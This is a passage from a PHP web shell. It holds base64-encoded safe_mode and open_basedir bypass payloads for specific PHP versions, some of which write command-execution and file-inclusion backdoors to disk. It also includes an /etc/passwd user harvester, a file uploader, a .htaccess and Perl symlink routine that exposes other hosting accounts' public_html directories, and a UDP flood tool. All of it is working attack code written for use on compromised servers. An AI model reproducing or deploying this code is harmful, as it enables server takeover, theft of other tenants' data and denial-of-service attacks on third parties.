UGF0aCBkb2VzbnQgZXhpc3Qgb3IgaXMgbm90IHdyaXRlYWJsZSEgY2hvb3NlIGFu
b3RoZXIgcGF0aCEiKTsKCglpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNb
J0YxJ11bJ3RtcF9uYW1lJ10sICRUYXJnZXRGaWxlKSkKCXsKCQllY2hvICI8QlI+
JFRhcmdldEZpbGUgaXMgdmFsaWQsIGFuZCB3YXMgc3VjY2Vzc2Z1bGx5IHVwbG9h
ZGVkLiI7Cgl9IGVsc2UKCXsKCQlkaWUoIjxCUj4kVGFyZ2V0RmlsZSBDb3VsZCBu
b3QgdXBsb2FkLiIpOwoJfQoJY2htb2QoJFRhcmdldEZpbGUgLCAwNzc3KTsKfQoK
Pz4=");
$fpS = @fopen("$Version-B.php",'w');
$fwS = @fwrite($fpS,$fileS);
if ($fwS) {
echo "<font color=green>[+] ByPasser Successful Created : <a href=$Version-B.php>$Version-B.php</a></font>";
}
else {
Echo "<font color=red>[+] No Perm !</font><Br>";
}
@fclose($fpS);
break;
case '5.2.6' :
CreateByPasser('PD9waHAKaWYgKCRfR0VUWyd4J10pIHsgaW5jbHVkZSgkX0dFVFsneCddKTsgfQpp
ZiAoJF9QT1NUWydjeGMnXT09J2Rvd24nKSB7CmhlYWRlcigiQ29udGVudC1kaXNw
b3NpdGlvbjogZmlsZW5hbWU9ZGVjb2RlLnR4dCIpOwpoZWFkZXIoIkNvbnRlbnQt
dHlwZTogYXBwbGljYXRpb24vb2N0ZXRzdHJlYW0iKTsKaGVhZGVyKCJQcmFnbWE6
IG5vLWNhY2hlIik7CmhlYWRlcigiRXhwaXJlczogMCIpOwplcnJvcl9yZXBvcnRp
bmcoMCk7CmVjaG8gYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3hDb2QnXSk7CmV4aXQ7
Cn0KPz4KPGh0bWw+CjxoZWFkPgo8dGl0bGU+U2l5YW51ci5QSFAgNS4yLjYgLyA1
LjIuNiBzYWZlX21vZGUgSGFuZGxlciBieXBhc3MgKEJldGEgRnJlZSBFZGl0aW9u
KSAgLSBQb3dlcmVkIEJ5IE1lY1RydXk8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IGJn
Y29sb3I9IiMwMDAwMDAiPgo8Zm9udCBjb2xvcj1GRjgwMDA+Cjxmb250IGZhY2U9
dmVyZGFuYT4KPD9waHAKaWYgKGVtcHR5KCRfUE9TVFsncGhwaW5mbyddICkpIHsK
CX1lbHNlewoJZWNobyAkcGhwaW5mbz0oIWVyZWdpKCJwaHBpbmZvIiwkZGlzX2Z1
bmMpKSA/IHBocGluZm8oKSA6ICJwaHBpbmZvKCkiOwoJZXhpdDsKfQpmdW5jdGlv
biBnZXRzeXN0ZW0oKQp7cmV0dXJuIHBocF91bmFtZSgncycpLiIgIi5waHBfdW5h
bWUoJ3InKS4iICIucGhwX3VuYW1lKCd2Jyk7fTsgCmZ1bmN0aW9uIHNhZmVfbW9k
ZSgpewppZighJHNhZmVfbW9kZSAmJiBzdHJwb3MoZXgoImVjaG8gYWJjaDBsZCIp
LCJoMGxkIikhPTMpeyRfU0VTU0lPTlsnc2FmZV9tb2RlJ10gPSAxO3JldHVybiAi
PGI+PGZvbnQgY29sb3I9IzgwMDAwMCBmYWNlPVZlcmRhbmE+T048L2ZvbnQ+PC9i
PiI7fWVsc2V7ICAgJF9TRVNTSU9OWydzYWZlX21vZGUnXSA9IDA7cmV0dXJuICI8
Zm9udCBjb2xvcj0jMDA4MDAwPjxiPk9GRjwvYj48L2ZvbnQ+Ijt9Cn07ZnVuY3Rp
b24gZXgoJGluKXsKJG91dCA9ICcnOwppZihmdW5jdGlvbl9leGlzdHMoJ2V4ZWMn
KSl7ZXhlYygkaW4sJG91dCk7JG91dCA9IGpvaW4oIlxuIiwkb3V0KTt9ZWxzZWlm
KGZ1bmN0aW9uX2V4aXN0cygncGFzc3RocnUnKSl7b2Jfc3RhcnQoKTtwYXNzdGhy
dSgkaW4pOyRvdXQgPSBvYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTt9
CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKXtvYl9zdGFydCgpO3N5
c3RlbSgkaW4pOyRvdXQgPSBvYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4o
KTt9CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSl7JG91dCA9
IHNoZWxsX2V4ZWMoJGluKTt9CmVsc2VpZihpc19yZXNvdXJjZSgkZiA9IHBvcGVu
KCRpbiwiciIpKSl7JG91dCA9ICIiO3doaWxlKCFAZmVvZigkZikpIHsgJG91dCAu
PSBmcmVhZCgkZiwxMDI0KTt9CnBjbG9zZSgkZik7fQpyZXR1cm4gJG91dDt9Cj8+
CiAgPHRyPgogICAgPHRkIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjQzIj4KCiAgICA8
dGFibGUgYm9yZGVyPSIxIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAi
IGJvcmRlcmNvbG9yPSIjNTQ1NDU0IiB3aWR0aD0iMTAwJSIgaWQ9IkF1dG9OdW1i
ZXIyIiBiZ2NvbG9yPSIjNDI0MjQyIiBzdHlsZT0iYm9yZGVyLWNvbGxhcHNlOiBj
b2xsYXBzZSI+CiAgICAgIDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIGJn
Y29sb3I9IiMwMDAwMDAiPgo8L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+CiAg
ICAgICAgPHRkIHdpZHRoPSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgxKUZv
bnRzNDQtTmV0OyBjb2xvcjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZvbnQt
d2VpZ2h0OiBib2xkIiBkaXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPktlcm5l
bCA6PC9mb250PiA8P3BocCBlY2hvIEBwaHBfdW5hbWUoKTs/PjwvdGQ+CiAgICAg
IDwvdHI+CiAgICAgIDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIHN0eWxl
PSJmb250LWZhbWlseTogKDEpRm9udHM0NC1OZXQ7IGNvbG9yOiAjRkYwMDAwOyBm
b250LXNpemU6IDhwdDsgZm9udC13ZWlnaHQ6IGJvbGQiIGRpcj0ibHRyIj48Zm9u
dCBjb2xvcj1mZmZmZmY+U2VydmVyIDo8L2ZvbnQ+IDw/cGhwIGVjaG8gJF9TRVJW
RVJbJ1NFUlZFUl9OQU1FJ107Pz48L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+
CiAgICAgICAgPHRkIHdpZHRoPSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgx
KUZvbnRzNDQtTmV0OyBjb2xvcjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZv
bnQtd2VpZ2h0OiBib2xkIiBkaXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPlBI
UCA6PC9mb250PiA8P3BocCBlY2hvIHBocHZlcnNpb24oKTs/PjwvdGQ+CiAgICAg
IDwvdHI+CiAgICAgIDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIHN0eWxl
PSJmb250LWZhbWlseTogKDEpRm9udHM0NC1OZXQ7IGNvbG9yOiAjRkYwMDAwOyBm
b250LXNpemU6IDhwdDsgZm9udC13ZWlnaHQ6IGJvbGQiIGRpcj0ibHRyIj48Zm9u
dCBjb2xvcj1mZmZmZmY+RGljIDo8L2ZvbnQ+IDw/cGhwIGVjaG8gZ2V0Y3dkKCk7
Pz48L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+CiAgICAgICAgPHRkIHdpZHRo
PSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgxKUZvbnRzNDQtTmV0OyBjb2xv
cjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZvbnQtd2VpZ2h0OiBib2xkIiBk
aXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPlNhZmVfTW9kZSA6PC9mb250PiA8
P3BocCBlY2hvIHNhZmVfbW9kZSgpOz8+PC90ZD4KICAgICAgPC90cj4KICAgICAg
PHRyPgogICAgICAgIDx0ZCB3aWR0aD0iMTAwJSIgc3R5bGU9ImZvbnQtZmFtaWx5
OiAoMSlGb250czQ0LU5ldDsgY29sb3I6ICNGRjAwMDA7IGZvbnQtc2l6ZTogOHB0
OyBmb250LXdlaWdodDogYm9sZCIgZGlyPSJsdHIiPjxmb250IGNvbG9yPWZmZmZm
Zj5Tb2Z0d2FyZSA6PC9mb250PiA8P3BocCBlY2hvIGdldGVudigiU0VSVkVSX1NP
RlRXQVJFIik7Pz48L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+CiAgICAgICAg
PHRkIHdpZHRoPSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgxKUZvbnRzNDQt
TmV0OyBjb2xvcjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZvbnQtd2VpZ2h0
OiBib2xkIiBkaXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPmlEIDo8L2ZvbnQ+
IDw/cGhwIGVjaG8gc3lzdGVtKGlkKTs/PjwvdGQ+CiAgICAgIDwvdHI+CiAgICAg
IDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIHN0eWxlPSJmb250LWZhbWls
eTogKDEpRm9udHM0NC1OZXQ7IGNvbG9yOiAjRkYwMDAwOyBmb250LXNpemU6IDhw
dDsgZm9udC13ZWlnaHQ6IGJvbGQiIGRpcj0ibHRyIj48Zm9udCBjb2xvcj1mZmZm
ZmY+QzBubmVjdCA/IDo8L2ZvbnQ+IDw/cGhwIGVjaG8gKCRfU0VSVkVSWydIVFRQ
X0NPTk5FQ1RJT04nXSk7Pz4gICA8Zm9udCBjb2xvcj1mZmZmZmY+UG9ydCA6PC9m
b250PiA8P3BocCBlY2hvICgiOiIuJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0pOz8+
ICA8L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+CiAgICAgICAgPHRkIHdpZHRo
PSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgxKUZvbnRzNDQtTmV0OyBjb2xv
cjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZvbnQtd2VpZ2h0OiBib2xkIiBk
aXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPllvdXIgQWdlbnQgOjwvZm9udD4g
PD9waHAgZWNobyAoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKTs/PiAgIDxm
b250IGNvbG9yPWZmZmZmZj5Zb3VyIGlwIGluZm8gOjwvZm9udD4gPD9waHAgZWNo
byAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pOz8+ICAgTXlTUUw6IDwvdGQ+CiAg
ICAgIDwvdHI+CiAgICAgIDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIHN0
eWxlPSJmb250LWZhbWlseTogKDEpRm9udHM0NC1OZXQ7IGNvbG9yOiAjRkYwMDAw
OyBmb250LXNpemU6IDhwdDsgZm9udC13ZWlnaHQ6IGJvbGQiIGRpcj0ibHRyIj48
Zm9udCBjb2xvcj1mZmZmZmY+UHJvdG9rb2wgOjwvZm9udD4gPD9waHAgZWNobyAo
JF9TRVJWRVJbIlNFUlZFUl9QUk9UT0NPTCJdKTs/PiAgIDxmb250IGNvbG9yPWZm
ZmZmZj5DaGFyc2V0IDo8L2ZvbnQ+IDw/cGhwIGVjaG8gKCRfU0VSVkVSWydIVFRQ
X0FDQ0VQVF9DSEFSU0VUJ10pOz8+ICAgPGZvbnQgY29sb3I9ZmZmZmZmPkVuY29k
aW5nIDo8L2ZvbnQ+IDw/cGhwIGVjaG8gKCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9F
TkNPRElORyddKTs/PiAgIDxmb250IGNvbG9yPWZmZmZmZj5MYW5nIDo8L2ZvbnQ+
IDw/cGhwIGVjaG8gKCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKTs/
PjwvdGQ+CiAgICAgIDwvdHI+CiAgICAgIDx0cj4KICAgICAgPC90cj4KICAgIDwv
dGFibGU+CiAgICA8L3RkPgogIDwvdHI+CiAgPHRyPgogICAgPHRkIHdpZHRoPSIx
MDAlIiBoZWlnaHQ9IjEiPjw/cGhwCmlmIChlbXB0eSgkX1BPU1RbJ3ozciddKSl7
CgkKCWVjaG8gJzxmb3JtIG1ldGhvZD0iUE9TVCI+JzsKCWVjaG8gJzxpbnB1dCB0
eXBlPSJ0ZXh0IiBuYW1lPSJ6M3IiIHNpemU9IjUwIiB2YWx1ZT0iL2hvbWUvaGVk
ZWZ1c2VyL3B1YmxpY19odG1sL2luZGV4LnBocCI+JzsKCWVjaG8gJzxpbnB1dCB0
eXBlPSJzdWJtaXQiIHZhbHVlPSJFbmNvZGUiPic7CgllY2hvICc8L2Zvcm0+JzsK
fWVsc2V7CgkkYjRzZTY0ID0kX1BPU1RbJ3ozciddOwoJJGhlbm8gPWJhc2U2NF9l
bmNvZGUoJGI0c2U2NCk7CgllY2hvICc8cCBhbGlnbj0iY2VudGVyIj4nOwoJZWNo
byAnPHRleHRhcmVhIG1ldGhvZD0iUE9TVCIgcm93cz0iMSIgY29scz0iODAiIHdy
YXI9Im9mZiI+JzsKCXByaW50ICRoZW5vOwoJZWNobyAnPC90ZXh0YXJlYT4nOwp9
CgllY2hvICc8Zm9ybSBtZXRob2Q9InBvc3QiIC8+PGlucHV0IHR5cGU9InRleHQi
IG5hbWU9ImN6IiBzaXplPSI1MCIgdmFsdWU9IkVuY29kZSBlZGlsbWkPIGtvZCBi
dXJheWEuLiIgLz48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iT0sgISEiIC8+
PHNlbGVjdCBuYW1lPWRlYz48b3B0aW9uIHZhbHVlPXNob3c+T2t1PC9vcHRpb24+
PG9wdGlvbiB2YWx1ZT1kZWNvZGU+RGUkaWZyZTwvb3B0aW9uPjwvc2VsZWN0Pjwv
Zm9ybT4nOwoKCWlmKCAhZW1wdHkoJF9QT1NUWydjeiddKSApCgkJaWYgKCRkZWM9
PSdkZWNvZGUnKXtlY2hvICI8Zm9ybSBuYW1lPWZvcm0gbWV0aG9kPVBPU1Q+Ijt9
CgkJZWNobyAiPHAgYWxpZ249bGVmdD48dGV4dGFyZWEgbWV0aG9kPSdQT1NUJyBu
YW1lPSd4Q29kJyBjb2xzPSc2MCcgcm93cz0nMjUnIHdyYXI9J29mZicgPiI7CgkK
CQkJJHNzPSRfUE9TVFsnY3onXTsKCQkJJGZpbGUgPSBiYXNlNjRfZGVjb2RlKCRz
cyk7CgkJCQkJaWYoKGN1cmxfZXhlYyhjdXJsX2luaXQoImZpbGU6ZnRwOi8vLi4v
Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
Ii4kZmlsZSkpKSBhTmQgZW1wdFkoJGZpbGUpKQkKCQkJCWlmICgkX1BPU1RbJ2Rl
YyddPT0nZGVjb2RlJyl7ZWNobyBiYXNlNjRfZW5jb2RlKCRfUE9TVFsneENvZCdd
KTt9CmVjaG8gIjwvdGV4dGFyZWE+PC9wPiI7Cj8+PC90ZD4KICA8L3RyPgogIDx0
cj4KICAgIDx0ZCB3aWR0aD0iMTAwJSIgc3R5bGU9ImZvbnQtZmFtaWx5OiAoMSlG
b250czQ0LU5ldDsgY29sb3I6ICNGRkZGRkY7IGZvbnQtc2l6ZTogOHB0OyBmb250
LXdlaWdodDogYm9sZCIgaGVpZ2h0PSIxMyI+PD9waHAgaWYgKCRkZWM9PSdkZWNv
ZGUnKXsgZWNobyAiPHAgYWxpZ249Y2VudGVyPjxpbnB1dCB0eXBlPWhpZGRlbiBu
YW1lPWN4YyB2YWx1ZT0nZG93bic+PGlucHV0IHR5cGU9c3VibWl0IG5hbWU9c3Vi
bWl0IHZhbHVlPSdEb3duTG9hZCc+PC9wPjwvZm9ybT4iOyB9ID8+PC90ZD4KICA8
L3RyPgogIDx0cj4KICAgIDx0ZCB3aWR0aD0iMTAwJSIgc3R5bGU9ImZvbnQtZmFt
aWx5OiAoMSlGb250czQ0LU5ldDsgY29sb3I6ICNGRkZGRkY7IGZvbnQtc2l6ZTog
OHB0OyBmb250LXdlaWdodDogYm9sZCIgaGVpZ2h0PSIxMyI+CiAgICA8cCBhbGln
bj0ibGVmdCI+PGZvbnQgc2l6ZT0iMSI+U2l5YW51ci5QSFAgPC9mb250PiA8YSBo
cmVmPSJodHRwOi8vd3d3LmltaGF0aW1pLm9yZyI+CiAgICA8Zm9udCBzaXplPSIx
IiBjb2xvcj0iIzhCOEI4QiI+d3d3LmltaGF0aW1pLm9yZzwvZm9udD48L2E+ICAg
PGEgaHJlZj0iaHR0cDovL3d3dy5zcHloYWNrZXJ6LmNvbSI+CiAgICA8Zm9udCBz
aXplPSIxIiBjb2xvcj0iIzhCOEI4QiI+d3d3LnNweWhhY2tlcnouY29tPC9mb250
PjwvYT48L3RkPgogIDwvdHI+CiAgPHRyPgogICAgPHRkIHdpZHRoPSIxMDAlIiBz
dHlsZT0iZm9udC1mYW1pbHk6ICgxKUZvbnRzNDQtTmV0OyBjb2xvcjogI0ZGRkZG
RjsgZm9udC1zaXplOiA4cHQ7IGZvbnQtd2VpZ2h0OiBib2xkIiBoZWlnaHQ9IjEz
Ij4KICAgIDxwIGFsaWduPSJsZWZ0Ij4gPGZvbnQgc2l6ZT0iMSI+Q29kZWQgQnkg
TWVjVHJ1eTwvZm9udD48L3RkPgogIDwvdHI+CjwvdGFibGU+CiAgPC9jZW50ZXI+
CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=');
break;
case '5.2.9' :
CreateByPasser('PD9waHAKJGZyZWloZWl0PWZvcGVuKCcuL2N4NTI5LnBocCcsICd3Jyk7CmZ3cml0
ZSgkZnJlaWhlaXQsIGJhc2U2NF9kZWNvZGUoIgpQRDl3YUhBTkNpOHFEUXB6WVda
bFgyMXZaR1VnWVc1a0lHOXdaVzVmWW1GelpXUnBjaUJDZVhCaGMzTWdVRWhRSURV
dU1pNDUKRFFwaWVTQk5ZV3R6ZVcxcGJHbGhiaUJCY21OcFpXMXZkMmxqZWlCb2RI
UndPaTh2YzJWamRYSnBkSGx5WldGemIyNHVZMjl0Ckx3MEtZM2hwWWlCYklHRXVW
RjBnYzJWamRYSnBkSGx5WldGemIyNGdXeUJrTUhSZElHTnZiUTBLRFFwT1QxUkZP
ZzBLYUhSMApjRG92TDNObFkzVnlhWFI1Y21WaGMyOXVMbU52YlM5aFkyaHBaWFps
YldWdWRGOXpaV04xY21sMGVXRnNaWEowTHpZeERRb04KQ2tWWVVFeFBTVlE2RFFw
b2RIUndPaTh2YzJWamRYSnBkSGx5WldGemIyNHVZMjl0TDJGamFHbGxkbVZ0Wlc1
MFgyVjRjR3h2CmFYUmhiR1Z5ZEM4eE1BMEtLaThOQ2cwS2FXWW9JV1Z0Y0hSNUtD
UmZSMFZVV3lkbWFXeGxKMTBwS1NBa1ptbHNaVDBrWDBkRgpWRnNuWm1sc1pTZGRP
dzBLWld4elpTQnBaaWdoWlcxd2RIa29KRjlRVDFOVVd5ZG1hV3hsSjEwcEtTQWta
bWxzWlQwa1gxQlAKVTFSYkoyWnBiR1VuWFRzTkNnMEtaV05vYnlBblBGQlNSVDQ4
VUQ1VWFHbHpJR2x6SUdWNGNHeHZhWFFnWm5KdmJTQThZUTBLCmFISmxaajBpYUhS
MGNEb3ZMM05sWTNWeWFYUjVjbVZoYzI5dUxtTnZiUzhpSUhScGRHeGxQU0pUWldO
MWNtbDBlVUYxWkdsMApJajVUWldOMWNtbDBlU0JCZFdScGRDQXRJRk5sWTNWeWFY
UjVVbVZoYzI5dVBDOWhQaUJzWVdKekxnMEtRWFYwYUc5eUlEb2cKVFdGcmMzbHRh
V3hwWVc0Z1FYSmphV1Z0YjNkcFkzb05Danh3UGxOamNtbHdkQ0JtYjNJZ2JHVm5Z
V3dnZFhObElHOXViSGt1CkRRbzhjRDVRU0ZBZ05TNHlMamtnYzJGbVpWOXRiMlJs
SUNZZ2IzQmxibDlpWVhObFpHbHlJR0o1Y0dGemN3MEtQSEErVFc5eQpaVG9nUEdF
Z2FISmxaajBpYUhSMGNEb3ZMM05sWTNWeWFYUjVjbVZoYzI5dUxtTnZiUzhpUGxO
bFkzVnlhWFI1VW1WaGMyOXUKUEM5aFBnMEtQSEErUEdadmNtMGdibUZ0WlQwaVpt
OXliU0lnWVdOMGFXOXVQU0pvZEhSd09pOHZKeTRrWDFORlVsWkZVbHNpClNGUlVV
RjlJVDFOVUlsMHVhSFJ0YkhOd1pXTnBZV3hqYUdGeWN5Z2tYMU5GVWxaRlVsc2lV
ME5TU1ZCVVgwNE5Da0ZOUlNKZApLUzRrWDFORlVsWkZVbHNpVUVoUVgxTkZURVlp
WFM0bklpQnRaWFJvYjJROUluQnZjM1FpUGp4cGJuQjFkQ0IwZVhCbFBTSjAKWlho
MElpQnVZVzFsUFNKbWFXeGxJaUJ6YVhwbFBTSTFNQ0lnZG1Gc2RXVTlJaWN1YUhS
dGJITndaV05wWVd4amFHRnljeWdrClptbHNaU2t1SnlJK1BHbHVjSFYwSUhSNWNH
VTlJbk4xWW0xcGRDSWdibUZ0WlQwaWFHRnlaSE4wZVd4bGVpSWdkbUZzZFdVOQpJ
bE5vYjNjaVBqd3ZabTl5YlQ0bk93MEtEUW9OQ2lSc1pYWmxiRDB3T3cwS0RRcHBa
aWdoWm1sc1pWOWxlR2x6ZEhNb0ltWnAKYkdVNklpa3BEUW9KYld0a2FYSW9JbVpw
YkdVNklpazdEUXBqYUdScGNpZ2labWxzWlRvaUtUc05DaVJzWlhabGJDc3JPdzBL
CkRRb2thR0Z5WkhOMGVXeGxJRDBnWlhod2JHOWtaU2dpTHlJc0lDUm1hV3hsS1Rz
TkNnMEtabTl5S0NSaFBUQTdKR0U4WTI5MQpiblFvSkdoaGNtUnpkSGxzWlNrN0pH
RXJLeWw3RFFvSmFXWW9JV1Z0Y0hSNUtDUm9ZWEprYzNSNWJHVmJKR0ZkS1NsN0RR
b0oKQ1dsbUtDRm1hV3hsWDJWNGFYTjBjeWdrYUdGeVpITjBlV3hsV3lSaFhTa3BJ
QTBLQ1FrSmJXdGthWElvSkdoaGNtUnpkSGxzClpWc2tZVjBwT3cwS0NRbGphR1Jw
Y2lna2FHRnlaSE4wZVd4bFd5UmhYU2s3RFFvSkNTUnNaWFpsYkNzck93MEtDWDBO
Q24wTgpDZzBLZDJocGJHVW9KR3hsZG1Wc0xTMHBJR05vWkdseUtDSXVMaUlwT3cw
S0RRb2tZMmdnUFNCamRYSnNYMmx1YVhRb0tUc04KQ2cwS1kzVnliRjl6WlhSdmNI
UW9KR05vTENCRFZWSk1UMUJVWDFWU1RDd2dJbVpwYkdVNlptbHNaVG92THk4aUxp
Um1hV3hsCktUc05DZzBLWldOb2J5QW5QRVpQVGxRZ1EwOU1UMUk5SWxKRlJDSStJ
RHgwWlhoMFlYSmxZU0J5YjNkelBTSTBNQ0lnWTI5cwpjejBpTVRJd0lqNG5PdzBL
RFFwcFppaEdRVXhUUlQwOVkzVnliRjlsZUdWaktDUmphQ2twRFFvSlpHbGxLQ2Mr
VTI5eWNua3UKTGk0Z1JtbHNaU0FuTG1oMGJXeHpjR1ZqYVdGc1kyaGhjbk1vSkda
cGJHVXBMaWNnWkc5bGMyNTBJR1Y0YVhOMGN5QnZjaUI1CmIzVWdaRzl1ZENCb1lY
WmxJSEJsY20xcGMzTnBiMjV6TGljcE93MEtEUXBsWTJodklDY2dQQzkwWlhoMFlY
SmxZVDRnUEM5RwpUMDVVUGljN0RRb05DbU4xY214ZlkyeHZjMlVvSkdOb0tUc05D
ZzBLUHo0PQoiKSk7CmZjbG9zZSgkZnJlaWhlaXQpOwplY2hvICJleHBsb2l0IGhh
cyBiZWVuIGdlbmVyYXRlZCAuIHVzZSBjeDUyOS5waHAgZmlsZSI7Cj8+IA==');
break;
default :
echo "<font color=red>[+] Not Found Any ByPasser For This Version : $Version</font><Br>";
}
}

if (isset($_POST['SaveUser_TXT'])) {
@unlink('Users.txt');
$lines=@file('/etc/passwd');
if (!$lines) {
$authp = @popen("/bin/cat /etc/passwd", "r");
$i = 0;
while (!feof($authp))
$aresult[$i++] = fgets($authp, 4096);
$lines = $aresult;
@pclose($authp);
}
if (!$lines) {
$EtcUrl = @$_REQUEST['etcAdd'];
$lines=@file("$EtcUrl");
}
if (!$lines) {
echo "<font color=red>[+] Can't Open /etc/passwd File . </font><Br>";
}
else {
foreach($lines as $line_num=>$line){
$sprt=explode(":",$line);
$user=$sprt[0];
$handle = @fopen("Users.txt","a");
if ($handle) {
    @fwrite($handle, "$user\n");
    @fclose($handle);
			 }
}
echo "<font color=green>[+] Users.txt Created Successful</font><BR>";
}
}
if (isset($_POST['GoDir'])) {
$default_dir = @$_POST['GoDir'];
if(!($dp = @opendir($default_dir))) echo("<font color=red>Access Denied : $default_dir !</font>");
while($file = @readdir($dp)) 
   if($file != '.' && $file != '..') {
   if (is_file("$file") == True) {
   echo "<b>$file<br>";
   } else {
   echo "<font color=green><b>$file<br></font>";
   }
   }
@closedir($dp);
}
if (isset($_POST['Upload_Start'])) {
$path = './' ;
if(isset($_POST['Upload_Start']))
{
    if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name']))
    {
            if( file_exists($path . $HTTP_POST_FILES['userfile']['name'] ) )
            {
                @unlink( $path . $HTTP_POST_FILES['userfile']['name'] );
            }
            if(@rename($HTTP_POST_FILES['userfile']['tmp_name'],$path.$HTTP_POST_FILES['userfile']['name']))
            {
                $html_output = 'Upload Sucessful !<br>';
                $html_output .= 'File Name: '.$HTTP_POST_FILES['userfile']['name'].'<br>';
                $html_output .= 'File Size: '.$HTTP_POST_FILES['userfile']['size'].' bytes<br>';
                $html_output .= 'File Type: '.$HTTP_POST_FILES['userfile']['type'].'<br>';
                $image = $HTTP_POST_FILES['userfile']['name'] ;
            } else
            {
                $html_output = 'Upload Failed !<br>';
                if(!is_writeable($path))
                {
                    $html_output = 'The Directory "'.$path.'" Must Be Writeable!<br>';
                } else
                {
                    $html_output = 'An Unknown Error Ocurred .<br>';      
                }
            }
        }
    }
echo @$html_output;
}

if (isset($_POST['Submit12'])) {
@mkdir("h4ckcitydotorg");
@chdir("h4ckcitydotorg");
echo '<font color=green>[+] Directory [ h4ckcitydotorg ] Created .</font><Br>';
echo '<font color=green>[+] Directory Changed .</font><Br>';
$file3 = 'Options +FollowSymLinks
DirectoryIndex seees.html
RemoveHandler .php
AddType application/octet-stream .php';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);
if ($fw3) {
echo '<font color=green>[+] .htaccess File Created .</font><BR>';
}
else {
echo "<font color=red>[+] No Perm To Create .htaccess File !</font><BR>";
}
@fclose($fp3);
$fileS = base64_decode("IyEvdXNyL2Jpbi9wZXJsCm9wZW4gSU5QVVQsICI8L2V0Yy9wYXNzd2QiOwp3aGls
ZSAoIDxJTlBVVD4gKQp7CiRsaW5lPSRfOyBAc3BydD1zcGxpdCgvOi8sJGxpbmUp
OyAkdXNlcj0kc3BydFswXTsKc3lzdGVtKCdsbiAtcyAvaG9tZS8nLiR1c2VyLicv
cHVibGljX2h0bWwgJyAuICR1c2VyKTsKfQ==");
$fpS = @fopen("PL-Symlink.pl",'w');
$fwS = @fwrite($fpS,$fileS);
if ($fwS) {
$TEST=@file('/etc/passwd');
if (!$TEST) {
echo "<font color=red>[+] Can't Read /etc/passwd File .</font><BR>";
echo "<font color=red>[+] Can't Create Users Shortcuts .</font><BR>";
echo '<font color=red>[+] Finish !</font><BR>';
}
else {
echo @shell_exec("perl PL-Symlink.pl");
echo '<font color=green>[+] Users Shortcut Created .</font><BR>';
echo '<font color=green>[+] Finish !</font><BR>';
}
@fclose($fpS);
@unlink("PL-Symlink.pl");
}
else {
echo "<font color=red>[+] No Perm To Create Perl File !</font><BR>";
}
}
$ip = @$_POST['PHP_D_Host'];
$rand = @$_POST['PHP_D_Port'];
$exec_time = @$_POST['PHP_D_Packet'];
if (isset($_POST['PHP_D_Start']))
{
if ($ip or $rand or $exec_time == '')
{
echo "<font color=red>Usage : [ Host : 0.0.0.0 ] [ Port : 25 ] [ Packet Time : 99999 ]</font><BR>";
} else {
$packets = 0;
set_time_limit(0);
ignore_user_abort(FALSE);
$time = time();
print "Flooded: $ip On Port $rand <br><br>";
$max_time = $time+$exec_time;
for($i=0;$i<65535;$i++){
@$out .= "X";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Packet Complete at ".time('h:i:s')." With $packets (" . round(($packets*65)/1024, 2) . " MB) Packets Averaging ". round($packets/$exec_time, 2) . " Packets/s \n";
}
}
echo "	</td>
  </tr>
  <tr>
    <td bgcolor='#AA0000' class='td'><div align='center' class='style4'>: Commands : </div></td>
  </tr>
  <tr>
    <td><table width='100%' height='173'>
      <tr>
        <th class='td' style='border-bottom-width:thin;border-top-width:thin'><div align='right'><span class='style1'>Tools :</span></div></th>
        <td class='td' style='border-bottom-width:thin;border-top-width:thin'><form name='F1' method='post'>
